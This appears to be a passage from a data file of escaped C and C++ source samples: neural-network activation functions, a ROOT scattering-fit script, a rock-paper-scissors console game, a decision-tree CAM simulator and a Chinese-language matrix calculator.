{\n//        for (int j = 0; j < weight_input_bias_matrix.column; ++j) {\n//            int index = i * weight_input_bias_matrix.column + j;  // Calculate the index for a 1D array representation of the matrix\n//            dh_da_matrix.data[index] = (weight_input_bias_matrix.data[index] > 0) ? 1.0f : 0.0f;\n//        }\n//    }\n//}\n\n\nvoid Neural_Layer:: Initialize_dC_dy_Matrix(){\n    dC_dy_matrix= Matrix_Create_Zero(activated_output_matrix.row,activated_output_matrix.column);\n}\nvoid Neural_Layer::Initialize_Cost_Function_Matrix(){\n    C=Matrix_Create_Zero(activated_output_matrix.row,activated_output_matrix.column);\n}\n\nfloat Neural_Layer::Sigmoid_Function(float x) {\n    return 1.0f / (1.0f + std::exp(-x));\n}\n\nfloat Neural_Layer::ReLU(float x) {\n    return std::max(0.0f, x);\n}\n\nfloat Neural_Layer::LeakyReLU(float x) {\n    float alpha = 0.01;  // Example value, can be changed to the desired slope for negative inputs\n    return (x > 0) ? x : alpha * x;\n}\n\n\nfloat Neural_Layer::ELU(float x, float alpha) {\n    return (x > 0) ? x : alpha * (std::exp(x) - 1);\n}\n\nfloat Neural_Layer::Swish(float x) {\n    return x * (1.0f / (1.0f + std::exp(-x)));\n}\n\nfloat Neural_Layer::Tanh(float x) {\n    return std::tanh(x);\n}\n\nfloat Neural_Layer::Linear_Activation(float x) {\n    return x;\n}\n\nstatic void displayLayerDetails(const std::vector<Neural_Layer>& layers, int index)\n{\n    std::cout<<\"Layer Number: \"<<index<<std::endl;\n    std::cout<<\"Input Matrix\"<<std::endl;\n    Matrix_Display(layers[index].input_matrix);\n    std::cout<<\"Weight Matrix\"<<std::endl;\n    Matrix_Display(layers[index].weights_matrix);\n    std::cout<<\"Bias Matrix\"<<std::endl;\n    Matrix_Display(la",
    "#include <iostream>\n\n#include \"TCanvas.h\"\n#include \"TF1.h\"\n#include \"TH1.h\"\n#include \"TMath.h\"\n#include \"TRint.h\"\n\n#include \"./HeaderFile/MeasTrack.h\"\n#include \"MeasData.cc\"\n\ndouble GausFunc(double *x, double *par)\n{\n\treturn ((1.0 / (par[1] * sqrt(2 * TMath::Pi()))) * exp(-0.5 * pow((x[0] - par[0]) / par[1], 2)) * par[2]);\n}\ndouble GaussianSumFilterW3(double *x, double *par) // w = 3\n{\n\treturn GausFunc(x, par) + GausFunc(x, &par[3]) + GausFunc(x, &par[6]);\n}\ndouble GaussianSumFilterW4(double *x, double *par) // w = 4\n{\n\treturn GausFunc(x, par) + GausFunc(x, &par[3]) + GausFunc(x, &par[6]) + GausFunc(x, &par[9]);\n}\ndouble GaussianSumFilterW5(double *x, double *par) // w = 5\n{\n\treturn GausFunc(x, par) + GausFunc(x, &par[3]) + GausFunc(x, &par[6]) + GausFunc(x, &par[9]) + GausFunc(x, &par[12]);\n}\ndouble GaussianSumFilterW6(double *x, double *par) // w = 6\n{\n\treturn GausFunc(x, par) + GausFunc(x, &par[3]) + GausFunc(x, &par[6]) + GausFunc(x, &par[9]) + GausFunc(x, &par[12]) + GausFunc(x, &par[15]);\n}\n\nint main()\n{\n\tTRint app(\"myApp\",0,0);\n\tint Det = 10;\n\tMeasTrack measTrack;\n\tmeasTrack.Track.resize(Det);\n\n\tGetData gd;\n\tgd.GetDataFromRootFile(measTrack);\n\n\tTCanvas *c = new TCanvas();\n\tTH1 *h1 = new TH1F(\"\",\"\",100,-1.5,1.5);\n\n\t// Get Meas State Vector: r(x, tx)\n\tfor (int i = 0; i < Det; i++)\n\t{\n\t\tint Nevent = measTrack.Track[i].x.size();\n\t\tgd.SetiDet(i);\n\n\t\tfor (int j = 0; j < Nevent; j++)\n\t\t{\n\t\t\tgd.SetjEvent(j);\n\n\t\t\tif (i == 9)\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tgd.CaculateAndSaveScatter(measTrack);\n\n\t\t\th1 -> Fill(atan(measTrack.Track[i].tx[j]));\n\t\t}\n\t}\n\tfloat sigmaScatter = h1 -> GetStdDev();\n\tTF1 *fitFunc3 = new TF1(\"fitFunc3\", GaussianSumFilterW3, -1.5, 1.5, 9);\n\tdouble param3[] = {0., sigmaScatter, 1, 0., sigmaScatter * 10, 1, 0., sigmaScatter * 30, 1};\n\tfitFunc3 -> SetParameters(param3);\n\n\tTF1 *fitFunc4 = new TF1(\"fitFunc4\", GaussianSumFilterW4, -1.5, 1.5, 13);\n\tdouble param4[] = {0., sigmaScatter, 1, 0., sigmaScatter * 10, 1, 0., sigmaScatter * 30, 1, 0., sigmaScatter * 60, 1};\n\tfitFunc4 -> SetParameters(param4);\n\n\tTF1 *fitFunc5 = new TF1(\"fitFunc5\", GaussianSumFilterW5, -1.5, 1.5, 16);\n\tdouble param5[] = {0., sigmaScatter, 1, 0., sigmaScatter * 10, 1, 0., sigmaScatter * 30, 1, 0., sigmaScatter * 60, 1, 0., sigmaScatter * 90, 1};\n\tfitFunc5 -> SetParameters(param5);\n\n\tTF1 *fitFunc6 = new TF1(\"fitFunc6\", GaussianSumFilterW6, -1.5, 1.5, 19);\n\tdouble param6[] = {0., sigmaScatter, 1, 0., sigmaScatter * 10, 1, 0., sigmaScatter * 30, 1, 0., sigmaScatter * 60, 1, 0., sigmaScatter * 90, 1, 0., sigmaScatter * 120, 1};\n\tfitFunc6 -> SetParameters(param6);\n\n\tc -> cd();\n\th1 -> Draw();\n//\th1 -> Fit(fitFunc3);\n//\tfitFunc3 -> Draw(\"same\");\n//\tfitFunc3 -> SetLineColor(kBlue);\n\n//\th1 -> Fit(fitFunc4);\n//\tfitFunc4 -> Draw(\"same\");\n//\tfitFunc4 -> SetLineColor(kGreen + 2);\n\n\t// fith Gaus Function is the best\n\th1 -> Fit(fitFunc5);\n\tfitFunc5 -> Draw(\"same\");\n\tfitFunc5 -> SetLineColor(kRed);\n\tfitFunc5 -> SetLineWidth(4);\n\n//\th1 -> Fit(fitFunc6);\n//\tfitFunc6 -> Draw(\"same\");\n//\tfitFunc6 -> SetLineColor(kYellow);\n\n\tgPad -> SetLogy();\n\t\n\tc -> SaveAs(\"Figures/Coulomb Multiple Scattering-GSF.png\");\n\tc -> Modified();\n\tc -> Update();\n\n//\tstd::cout << \"Chi2 (w = 3): \" << fitFunc3 -> GetChisquare() << std::endl;\n//\tstd::cout << \"Chi2 (w = 4): \" << fitFunc4 -> GetChisquare() << std::endl;\n\tstd::cout << \"Chi2 (w = 5): \" << fitFunc5 -> GetChisquare() << std::endl;\n//\tstd::cout << \"Chi2 (w = 6): \" << fitFunc6 -> GetChisquare() << std::endl;\n\n\t// Result ChiSquare of GaussianSumFilter with W = 5 is the Min of all\n\t// Fifth Gaus Function is the best of GaussianSumFilter (W = 5)\n\n\tapp.Run();\n\treturn 0;\n}\n",
    "\ufeff#include \"header.h\"\r\n#include <cstdlib>\r\n#include <windows.h>\r\n\r\nPlayer user;\r\nPlayer computer;\r\n\r\nvoid Player::addWins() {\r\n\tthis->wins++;\r\n}\r\n\r\nint Player::checkWins() {\r\n\treturn this->wins;\r\n}\r\n\r\nvoid Game::mainMenu() {\r\n\tcout << \"\\n\\t ~ Rock Paper Scrissors ~ \\n \\t\\t\\tBy Popescu Paul\\n\\n \";\r\n\t\r\n\tcout << \"\\t\\t1. Play\\n\\t\\t2. Credits\\n\\t\\t3. Exit\";\r\n\tint choice;\r\n\tcout << \"\\n\\n\\t Choice: \"; cin >> choice;\r\n\tswitch (choice) {\r\n\tcase 1:\r\n\t\tstartGame();\r\n\t\tbreak;\r\n\tcase 2:\r\n\t\tcredits();\r\n\t\tbreak;\r\n\tcase 3:\r\n\t\tcout << \"\\n\\t Exiting...\";\r\n\t\tSleep(2000);\r\n\t\tbreak;\r\n\tdefault:\r\n\t\tcout << \" Choice not available.\";\r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\n\r\nvoid Game::startGame() {\r\n\tmaxWins = 0;\r\n\tcout << \"\\n How many games until game over? \\n \\t 3    5    7\\n\\n\\tChoice: \";\r\n\tint choice; cin >> choice;\r\n\tmaxWins = choice; cout << \"\\n You've chosen \" << maxWins << \" maximum wins needed.\";\r\n\tcout << \"\\n\\n\\t Game starting...\";\r\n\tSleep(3000);\r\n\tsystem(\"CLS\");\r\n\tRPSGame();\r\n}\r\n\r\nvoid Game::RPSGame() {\r\n\tsrand((unsigned)time(NULL));\r\n\r\n\twhile(user.wins < maxWins || computer.wins < maxWins) {\r\n\t\tcout << \"\\n\\n\\tMake your choice: \";\r\n\t\tcout << \"\\n 1. Rock \\n 2. Paper \\n 3. Scrissors \\n \\n \\t Choice: \";\r\n\r\n\t\t/*\r\n\t\tthe choices are:\r\n\t\t1. rock\r\n\t\t2. paper\r\n\t\t3. scrissors\r\n\t\t*/\r\n\r\n\t\tint choice; \r\n\t\tdo\r\n\t\t\tcin >> choice;\r\n\t\twhile (choice != (int)choice);\r\n\t\tcout << \"\\n\\t You chose: \\n\";\r\n\t\tswitch (choice) {\r\n\t\tcase 1:\r\n\t\t\trock();\r\n\t\t\tbreak;\r\n\t\tcase 2:\r\n\t\t\tpaper();\r\n\t\t\tbreak;\r\n\t\tcase 3:\r\n\t\t\tscissors();\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n\t\t\tcout << \"Choice not available.\";\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tint computer_choice = rand() % 3 + 1;\r\n\r\n\t\tcout << \"\\n\\n\\t Computer chose: \\n\\n\";\r\n\t\tif (computer_choice == 1) {\r\n\t\t\trock();\r\n\t\t\tif (choice == 3) {\r\n\t\t\t\tcout << \"\\n\\n\\t Computer wins!\\n\";\r\n\t\t\t\tcomputer.addWins();\r\n\t\t\t}\r\n\t\t\telse if (choice == 2) {\r\n\t\t\t\tcout << \"\\n\\n\\t User wins!\\n\";\r\n\t\t\t\tuser.addWins();\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\tcout << \"\\n Draw! Go again.\";\r\n\t\t\tcheckEndGame();\r\n\t\t\tSleep(1250);\r\n\t\t\tsystem(\"CLS\");\r\n\t\t}\r\n\t\telse if (computer_choice == 2) {\r\n\t\t\tpaper();\r\n\t\t\tif (choice == 1) {\r\n\t\t\t\tcout << \"\\n\\n\\t Computer wins!\\n\";\r\n\t\t\t\tcomputer.addWins();\r\n\t\t\t}\r\n\t\t\telse if (choice == 3) {\r\n\t\t\t\tcout << \"\\n\\n\\t User wins!\\n\";\r\n\t\t\t\tuser.addWins();\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\tcout << \"\\n Draw! Go again.\";\r\n\t\t\tcheckEndGame();\r\n\t\t\tSleep(1250);\r\n\t\t\tsystem(\"CLS\");\r\n\t\t}\r\n\t\telse if (computer_choice == 3) {\r\n\t\t\tscissors();\r\n\t\t\tif (choice == 2) {\r\n\t\t\t\tcout << \"\\n\\n\\t Computer wins!\\n\";\r\n\t\t\t\tcomputer.addWins();\r\n\t\t\t}\r\n\t\t\telse if (choice == 1) {\r\n\t\t\t\tcout << \"\\n\\n\\t User wins!\\n\";\r\n\t\t\t\tuser.addWins();\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t\tcout << \"\\n Draw! Go again.\";\r\n\t\t\tcheckEndGame();\r\n\t\t\tSleep(1250);\r\n\t\t\tsystem(\"CLS\");\r\n\t\t}\r\n\t}\r\n\treturn;\r\n}\r\n\r\n\r\nvoid Game::credits() {\r\n\tsystem(\"cls\");\r\n\tcout << \"\\n\\n\\n\\t\\tGame by Popescu Paul\\n\";\r\n\tcout << \"\\t      2nd Year Student - Math UAIC\\n\\n\";\r\n\tcout << \"\\t\\tThank you for playing!   \\n\\n\\n\\n\";\r\n\tSleep(5000);\r\n\tsystem(\"cls\");\r\n\tmainMenu();\r\n\t//may add more\r\n}\r\n\r\n\r\nvoid Game::checkEndGame() {\r\n\tint winsU = user.checkWins();\r\n\tint winsC = computer.checkWins();\r\n\tif (winsU == maxWins) {\r\n\t\tcout << \"User WINS!\\nGame closing...\";\r\n\t\tSleep(2000);\r\n\t\texit(0);\r\n\t}\r\n\telse if (winsC == maxWins){\r\n\t\tcout << \"Computer WINS!\\nGame closing...\";\r\n\t\tSleep(2000);\r\n\t\texit(0);\r\n\t}\r\n}\r\n\r\nint main() {\r\n\tsystem(\"color E0\");\r\n\r\n\tGame game;\r\n\tgame.mainMenu();\r\n\treturn 0;\r\n}",
    "#include <cassert>\n#include <chrono>\n#include <cstring>\n#include <filesystem>\n#include <fstream>\n#include <iostream>\n#include <map>\n#include <set>\n#include <vector>\n\n#include \"CuCAMASim.h\"\n#include \"dt2cam.h\"\n#include \"matio.h\"\n#include \"util/CLI11.hpp\"\n\ndouble CAMInference(const std::filesystem::path configPath,\n                    const std::filesystem::path treeTextPath,\n                    const std::string datasetName) {\n  std::cout << \"Doing CAM inference\" << std::endl;\n  std::cout << \"Using tree text: \" << treeTextPath << std::endl;\n\n  DecisionTree dt(treeTextPath);\n  ACAMArray *camArray = dt.toACAM();\n\n  std::cout << \"CAM array size after DT mapping: \" << camArray->getDim().nCols\n            << \" Cols, \" << camArray->getDim().nRows << \" Rows\" << std::endl;\n\n  Dataset *dataset = loadDataset(datasetName);\n  std::cout << \"Dataset Size: \" << dataset->testInputs->getNFeatures()\n            << \" features, \"\n            << dataset->testInputs->getNVectors() +\n                   dataset->trainInputs->getNVectors()\n            << \" samples.\" << std::endl;\n\n  std::cout << \"DT Accuracy (original): \"\n            << dt.score(dataset->testInputs, dataset->testLabels) << std::endl;\n\n  CamConfig camConfig(configPath);\n  CuCAMASim camasim(&camConfig);\n\n  camasim.write(camArray);\n  camasim.query(dataset->testInputs, camasim.getSimResult());\n\n  double CAMAccuracy = camasim.getSimResult()->calculateInferenceAccuracy(\n      dataset->testLabels, camArray->getRow2classID());\n  std::cout << \"DT Accuracy (CAM): \" << CAMAccuracy << std::endl;\n\n  delete camArray;\n  if (dataset != nullptr) {\n    delete dataset;\n  }\n\n  std::cout << \"\\033[1;32m\" << \"CAMInference() finished without error\"\n            << \"\\033[0m\" << std::endl;\n  return CAMAccuracy;\n}\n\ndouble softwareInference(const std::filesystem::path configPath,\n                         const std::filesystem::path treeTextPath,\n                         const std::string datasetName) {\n  std::cout << \"Doing software inference\" << std::endl;\n\n  std::cout << \"Using software Inference config: \" << configPath << std::endl;\n  if (!std::filesystem::exists(configPath)) {\n    throw std::runtime_error(\"Config file not found!\");\n  }\n  YAML::Node config = YAML::LoadFile(configPath);\n\n  Dataset *dataset = loadDataset(datasetName);\n\n  double accuracy = 0;\n  if (config[\"weightVar\"][\"enabled\"].as<bool>() == false) {\n    DecisionTree dt(treeTextPath);\n    accuracy = dt.score(dataset->testInputs, dataset->testLabels);\n    std::cout << \"Software Inference accuracy: \" << accuracy << std::endl;\n  } else {\n    uint64_t sampleTimes = config[\"weightVar\"][\"sampleTimes\"].as<uint64_t>();\n    for (uint64_t i = 0; i < sampleTimes; i++) {\n      DecisionTree dt(treeTextPath);\n      dt.parseTreeText();\n      dt.addVariation(config[\"weightVar\"]);\n      accuracy += dt.score(dataset->testInputs, dataset->testLabels);\n    }\n    accuracy /= sampleTimes;\n    std::cout << \"Software Average inference accuracy: \" << accuracy\n              << std::endl;\n  }\n  return accuracy;\n}\n\nvoid errorDistribution(const std::filesystem::path configPath,\n                       const std::filesystem::path treeTextPath,\n                       const std::filesystem::path outputPath,\n                       const std::string datasetName,\n                       const uint32_t sampleTimes) {\n  std::cout << \"Doing statistic for error distribution\" << std::endl;\n\n  std::cout << \"Using tree text: \" << treeTextPath << std::endl;\n\n  struct errDistrResult {\n    double softwareIdealAccuracy = 0;\n    double camAccuracy = 0;\n    uint64_t softwareWrong = 0;\n    uint64_t oneMatchCorrect = 0;\n    uint64_t oneMatchWrong = 0;\n    uint64_t multiMatchCorrect = 0;\n    uint64_t multiMatchWrong = 0;\n    uint64_t noMatch = 0;\n  } result;\n\n  const Dataset *dataset = loadDataset(datasetName);\n\n  DecisionTree dt4idealSwInf(treeTextPath);\n  dt4idealSwInf.parseTreeText();\n  std::vector<uint32_t> swPred;\n  dt4idealSwInf.pred(dataset->testInputs, swPred);\n  result.softwareIdealAccuracy =\n      dataset->testLabels->calculateInferenceAccuracy(swPred);\n\n  delete dataset;\n\n  for (uint32_t nIter = 0; nIter < sampleTimes; nIter++) {\n    const Dataset *dataset = loadDataset(datasetName);\n    DecisionTree dt(treeTextPath);\n    ACAMArray *camArray = dt.toACAM();\n\n    CamConfig camConfig(configPath);\n    CuCAMASim camasim(&camConfig);\n\n    camasim.write(camArray);\n    camasim.query(dataset->testInputs, camasim.getSimResult());\n\n    const std::vector<std::vector<uint32_t>> camMatchedIdx =\n        camasim.getSimResult()->getMatchedIdx();\n\n    assert(swPred.size() == camMatchedIdx.size() && \"Pred length mismatch!\");\n\n    for (uint32_t i = 0; i < camMatchedIdx.size(); i++) {\n      const LabelData *testLabels = dataset->testLabels;\n      if (swPred[i] != testLabels->at(i)) {\n        result.softwareWrong += 1;\n      } else {\n        if (camMatchedIdx[i].size() == 0) {\n          result.noMatch += 1;\n        } else if (camMatchedIdx[i].size() == 1) {\n          if ((*camArray->getRow",
    "#include<stdio.h>\r\n#include<math.h>\r\n#include<stdlib.h>//\u5934\u6587\u4ef6 \r\nint i,j,m,n,p,q,k,x,y,order;//\r\nfloat result=0.0; //\u884c\u5217\u5f0f\u7ed3\u679c \r\nfloat determinant(float **a,int order);//\u884c\u5217\u5f0f\u51fd\u6570 \r\nfloat laplace(float **a,int r,int c,int order);//\u62c9\u666e\u62c9\u65af\u5c55\u5f00\u51fd\u6570 \r\nfloat inverse(float **a,int r,int c,int order); //\u9006\u77e9\u9635\u51fd\u6570 \r\nvoid print_inverse(float **a,int order);//\u8f93\u51fa\u9006\u77e9\u9635\u51fd\u6570 \r\nfloat adjoint(float **a,int r,int c,int order);//\u4f34\u968f\u77e9\u9635\u51fd\u6570 \r\nvoid print_adjoint(float **a,int order);//\u8f93\u51fa\u4f34\u968f\u77e9\u9635\u51fd\u6570 \r\nint main()\r\n{\r\n    printf(\"-----------------\u77e9\u9635\u8ba1\u7b97\u5668-----------------\\n\");\r\n    printf(\"------\u8bf7\u9009\u62e9\u529f\u80fd\uff1a\uff08\u9009\u62e9\u540e\u8bf7\u6309\u56de\u8f66\u952e\uff09  ----\\n\");\r\n    printf(\"------    0\uff1a\u9000\u51fa                -----------\\n\");\r\n    printf(\"------    1\uff1a\u8f6c\u7f6e\u77e9\u9635            -----------\\n\");\r\n    printf(\"------    2\uff1a\u77e9\u9635\u52a0\u6cd5            -----------\\n\");\r\n    printf(\"------    3\uff1a\u77e9\u9635\u4e58\u6cd5            -----------\\n\");\r\n    printf(\"------    4\uff1a\u77e9\u9635\u884c\u5217\u5f0f          -----------\\n\");\r\n    printf(\"------    5\uff1a\u9006\u77e9\u9635              -----------\\n\");\r\n    printf(\"------    6\uff1a\u4f34\u968f\u77e9\u9635            -----------\\n\");\r\n    printf(\"--------------------------------------------\\n\");//\u5934\u76ee \r\n    do\r\n    {\r\n    \tscanf(\"%d\",&x);//\u9009\u62e9\u9700\u8981\u8fdb\u884c\u7684\u529f\u80fd \r\n    \tswitch(x)\r\n    \t{\r\n    \t\tcase(0):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\\n\");\r\n    \t\t\tprintf(\"\u52a9\u6559\u522b\u5fd8\u4e86\u52a0\u5206\uff08\u4e00\u5b9a\u8981\u52a0\u5206\uff09\\n\"); \r\n    \t\t\tprintf(\"\u8bf7\u4ece0\u30011\u4e2d\u9009\u62e9\\n\");\r\n    \t\t\tprintf(\"0:\u5927\u6c14\u52a0\u5206\\n\");\r\n    \t\t\tprintf(\"1:\u5c31\u8fd9\uff1f\uff1f\uff1f\\n\");\r\n    \t\t\tdo\r\n\t\t\t\t{\r\n    \t\t\t  scanf(\"%d\",&y);\r\n    \t\t\t  switch(y) \r\n    \t\t\t  {\r\n    \t\t\t\t  case(0):\r\n    \t\t\t\t  {\r\n\t\t\t\t\t      printf(\"\\n\");\r\n    \t\t\t\t\t  printf(\"\u4e07\u5206\u611f\u8c22\uff0c\u52a9\u6559\u4f60\u6700\u597d\u770b\uff01  (\u70b9\u51fb\u4efb\u610f\u952e<\u522b\u70b9\u7535\u6e90\u952e\u3001num lock\u952e\u3001ctrl\u952e\u3001fn\u952e\u3001\u4e2d\u6587\u72b6\u6001\u4e0b\u7684\u5b57\u6bcd\u952e\u2026\u2026>\u9000\u51fa\u5594)\");\r\n\t\t\t\t\t  }\r\n\t\t\t\t\t  break;\r\n\t\t\t\t\t  case(1):\r\n\t\t\t\t\t  {\r\n\t\t\t\t\t\t  printf(\"\u5fd8\u4e86\u52a0\u5206\u5566 \uff08\u545c\u545c\u545c\u6ca1\u6709\u52a0\u5206  # __  #\uff09\\n\");\r\n\t\t\t\t\t\t  printf(\"\u8bf7\u518d\u6b21\u4ece0\u30011\u4e2d\u9009\u62e9\\n\");\r\n\t\t\t\t\t\t  printf(\"0\uff1a\u597d\u5427\u7ed9\u4f60\u52a0\u5206\\n\");\r\n\t\t\t\t\t\t  printf(\"1\uff1a\u5c31\u662f\u4e0d\u52a0\u5206\\n\");\r\n\t\t\t\t\t\t  printf(\"\\n\"); \r\n\t\t\t\t\t  }\r\n\t\t\t\t\t  break;\r\n\t\t\t\t  }\r\n\t\t\t    }\r\n\t\t\t    while(y);//\u5f53\u8f93\u51650\u65f6\u9000\u51fa\uff0c\u5426\u5219\u4e00\u76f4\u5faa\u73af \r\n\t\t    }\r\n\t\t\tbreak;\r\n\t\t\tcase(1):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\tfloat **a=(float**)malloc(sizeof(float*)*m);\r\n\t            int w;\r\n\t            for(w=0;w<m;w++)\r\n\t            a[w]=(float*)malloc(sizeof(float)*n);\r\n\t            float **b=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            b[w]=(float*)malloc(sizeof(float)*n);\r\n\t\t\t\twhile(m<=0||n<=0)//\u5224\u65ad\u662f\u5426\u5408\u6cd5 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u77e9\u9635\u4e0d\u5408\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&m,&n);\r\n\t\t\t\t} \r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635\uff1a\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)//\u8f93\u5165 \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&a[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t            for(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            b[i][j]=a[j][i];\r\n\t\t            }\r\n\t            }\r\n\t            printf(\"\u8fd9\u662f\u8f6c\u7f6e\u77e9\u9635\uff1a\\n\");\r\n\t            for(i=0;i<m;i++)//\u8f93\u51fa \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            printf(\"%.2f\\t\",b[i][j]);\r\n\t\t            }\r\n\t\t            printf(\"\\n\");\r\n               \t}\r\n               \tprintf(\"\\n\");\r\n               \tprintf(\"\u9009\u62e90\u9000\u51fa\uff0c\u6216\u9009\u62e9\u4e0b\u4e00\u4e2a\u60f3\u6267\u884c\u7684\u529f\u80fd\\n\"); \r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\t\tcase(2):\r\n\t\t\t{\r\n\t\t\t\tprintf(\"\u5728\u8fd9\u91cc\u8fdb\u884c\u77e9\u9635\u52a0\u6cd5\uff1a\\n\");\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\");\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&p,&q);\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\");\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\tfloat **a=(float**)malloc(sizeof(float*)*p);\r\n\t            int w;\r\n\t            for(w=0;w<p;w++)\r\n\t            a[w]=(float*)malloc(sizeof(float)*q);\r\n\t            float **b=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            b[w]=(float*)malloc(sizeof(float)*n);\r\n\t            float **c=(float**)malloc(sizeof(float*)*m);\r\n                for(w=0;w<m;w++)\r\n\t            c[w]=(float*)malloc(sizeof(float)*n);\r\n\t\t\t\twhile(p!=m||q!=n)//\u4e0d\u80fd\u76f8\u52a0\u91cd\u65b0\u8f93\u5165 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u8fd9\u4e24\u4e2a\u77e9\u9635\u4e0d\u80fd\u76f8\u52a0\u3002\\n\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u91cd\u65b0\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570,\u4f7f\u4e4b\u4e0e\u77e9\u9635a\u7684\u884c\u6570\u5217\u6570\u4e00\u81f4\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t\tscanf(\"%d%d\",&m,&n);\r\n\t\t\t\t}\r\n\t\t\t\twhile(m<=0||n<=0||p<=0||q<=0)//\u5224\u65ad\u662f\u5426\u5408\u6cd5 \r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"\u77e9\u9635\u4e0d\u5408\u6cd5\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\");\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&p,&q);\r\n\t\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\u7684\u884c\u6570\u548c\u5217\u6570\uff08\u7528\u7a7a\u683c\u9694\u5f00\uff09\uff1a\\n\");\r\n\t\t\t\t    scanf(\"%d%d\",&m,&n);\r\n\t\t\t\t} \r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635a\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<p;i++)//\u8f93\u5165 \r\n\t            {\r\n\t\t            for(j=0;j<q;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&a[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&b[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t\t\t\tprintf(\"\u4e24\u4e2a\u77e9\u9635\u76f8\u52a0\u7ed3\u679c\u4e3a\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            c[i][j]=a[i][j]+b[i][j];//\u76f8\u52a0\u8ba1\u7b97 \r\n\t\t            }\r\n\t            }\r\n\t\t\t\tfor(i=0;i<m;i++)//\u8f93\u51fa \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            printf(\"%.2f\\t\",c[i][j]);\r\n\t\t            }\r\n\t\t            printf(\"\\n\");\r\n\t            }\r\n\t            printf(\"\\n\");\r\n               \t",
